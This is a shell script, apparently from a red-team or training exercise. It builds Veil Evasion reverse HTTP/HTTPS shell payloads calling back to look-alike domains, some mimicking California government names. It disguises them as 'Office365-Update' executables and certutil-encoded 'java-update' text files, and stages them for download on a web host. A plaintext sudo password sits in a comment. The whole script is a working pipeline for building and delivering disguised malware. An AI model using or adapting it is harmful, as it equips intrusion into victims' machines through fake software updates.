# Create payload
cd ~/Veil
	#old stuff for backups until change is made ..delete after january 2020
		#./Veil.py -t Evasion -p 37 --ordnance-payload rev_http --ip ns.calgov.us --port 80 -e xor -b \\x00\\x13\\x98 -o Office365-Update01
		#./Veil.py -t Evasion -p 37 --ordnance-payload rev_http --ip ns2.capitalwatch.us --port 80 -e xor -b \\x00\\x13\\x98 -o Office365-Update02
		#./Veil.py -t Evasion -p 38 --ordnance-payload rev_https --ip cdn.calegislature.us --port 443 -e xor -b \\x00\\x13\\x98 -o Office365-Update03
		#./Veil.py -t Evasion -p 38 --ordnance-payload rev_https --ip owa.csbeacon.online --port 443 -e xor -b \\x00\\x13\\x98 -o Office365-Update04

#this is for kali1
#this is commented out till we can automate the creation process
#./Veil.py -t Evasion -p 37 --ordnance-payload rev_http --ip push.ad-tracker.org --port 53 -e xor -b \\x00\\x13\\x98 -o Office365-Update01
#it has been temporarly replaced with the below line
cp ~/artifact.exe /var/lib/veil/output/compiled/Office365-Update01.exe

#once this if fixed, we can delete the artifact.exe. this file was created on kali1, with cobalt strike

#this is for kali2
./Veil.py -t Evasion -p 38 --ordnance-payload rev_https --ip clients.idnslookup.net --port 515 -e xor -b \\x00\\x13\\x98 -o Office365-Update02

#this is kali3
#this is commented out till we can automate the creation process
#./Veil.py -t Evasion -p 37 --ordnance-payload rev_http --ip ns3.ad-tracker.org --port 80 -e xor -b \\x00\\x13\\x98 -o Office365-Update03
#it has been temporarly replaced with the below line
cp ~/artifact3.exe /var/lib/veil/output/compiled/Office365-Update03.exe
#once this if fixed, we can delete the artifact.exe. this file was created on kali1, with cobalt strike

#this is for kali4
./Veil.py -t Evasion -p 38 --ordnance-payload rev_https --ip sposvc.ad-tracker.org --port 515 -e xor -b \\x00\\x13\\x98 -o Office365-Update04

#this is for kali5
#./Veil.py -t Evasion -p 37 --ordnance-payload rev_http --ip ns5.adobe-research.net --port 80 -e xor -b \\x00\\x13\\x98 -o Office365-Update05
cp ~/artifact5.exe /var/lib/veil/output/compiled/Office365-Update05.exe

#this is for kali6
./Veil.py -t Evasion -p 38 --ordnance-payload rev_https --ip cdn.adobe-research.net --port 515 -e xor -b \\x00\\x13\\x98 -o Office365-Update06


##################################### now to use unicorn #################################3333

# use Unicorn to certutil encode files
cd /root/unicorn

# Generate Kali01 encoded file
python unicorn.py /var/lib/veil/output/compiled/Office365-Update01.exe crt
rm decode_attack/decode_command.bat
mv decode_attack/encoded_attack.crt decode_attack/java-update-8_181-01.txt

# Generate Kali02 encoded file
python unicorn.py /var/lib/veil/output/compiled/Office365-Update02.exe crt
rm decode_attack/decode_command.bat
mv decode_attack/encoded_attack.crt decode_attack/java-update-8_181-02.txt

# Generate Kali03 encoded file
python unicorn.py /var/lib/veil/output/compiled/Office365-Update03.exe crt
rm decode_attack/decode_command.bat
mv decode_attack/encoded_attack.crt decode_attack/java-update-8_181-03.txt

# Generate Kali04 encoded file
python unicorn.py /var/lib/veil/output/compiled/Office365-Update04.exe crt
rm decode_attack/decode_command.bat
mv decode_attack/encoded_attack.crt decode_attack/java-update-8_181-04.txt

# Generate Kali05 encoded file
python unicorn.py /var/lib/veil/output/compiled/Office365-Update05.exe crt
rm decode_attack/decode_command.bat
mv decode_attack/encoded_attack.crt decode_attack/java-update-8_181-05.txt

# Generate Kali06 encoded file
python unicorn.py /var/lib/veil/output/compiled/Office365-Update06.exe crt
rm decode_attack/decode_command.bat
mv decode_attack/encoded_attack.crt decode_attack/java-update-8_181-06.txt


# Copy files to Webhost
cd /root
scp /var/lib/veil/output/compiled/Office365-Update01.exe cndadmin@172.16.3.21:/home/cndadmin/temp
scp /var/lib/veil/output/compiled/Office365-Update02.exe cndadmin@172.16.3.21:/home/cndadmin/temp
scp /var/lib/veil/output/compiled/Office365-Update03.exe cndadmin@172.16.3.21:/home/cndadmin/temp
scp /var/lib/veil/output/compiled/Office365-Update04.exe cndadmin@172.16.3.21:/home/cndadmin/temp
scp /var/lib/veil/output/compiled/Office365-Update05.exe cndadmin@172.16.3.21:/home/cndadmin/temp
scp /var/lib/veil/output/compiled/Office365-Update06.exe cndadmin@172.16.3.21:/home/cndadmin/temp
scp /root/unicorn/decode_attack/java-update-8_181-01.txt cndadmin@172.16.3.21:/home/cndadmin/temp
scp /root/unicorn/decode_attack/java-update-8_181-02.txt cndadmin@172.16.3.21:/home/cndadmin/temp
scp /root/unicorn/decode_attack/java-update-8_181-03.txt cndadmin@172.16.3.21:/home/cndadmin/temp
scp /root/unicorn/decode_attack/java-update-8_181-04.txt cndadmin@172.16.3.21:/home/cndadmin/temp
scp /root/unicorn/decode_attack/java-update-8_181-05.txt cndadmin@172.16.3.21:/home/cndadmin/temp
scp /root/unicorn/decode_attack/java-update-8_181-06.txt cndadmin@172.16.3.21:/home/cndadmin/temp
#ssh cndadmin@172.16.3.21
#ssh -tt cndadmin@172.16.3.21 'echo '1qazxsw23edcvfr4' | sudo -S ./home/cndadmin/MoveFiles.sh'
#ssh -t cndadmin@172.16.3.21 'mv /home/cndadmin/temp/* /var/www/html/download/ && exit' 
#ssh -t cndadmin@172.16.3.21 'chown www-data:www-data /var/www/html/download/*.exe'
#sudo mv /home/cndadmin/temp/* /var/www/html/download/
#sudo chown www-data:www-data /var/www/html/download/*.txt 
#sudo chown wwd-data:www-data /var/www/html/download/*.exe
#exit
# Clean Veil
cd ~/Veil
./Veil.py --clean

# Clean Unicorn 
rm -R /root/unicorn/decode_attack/*
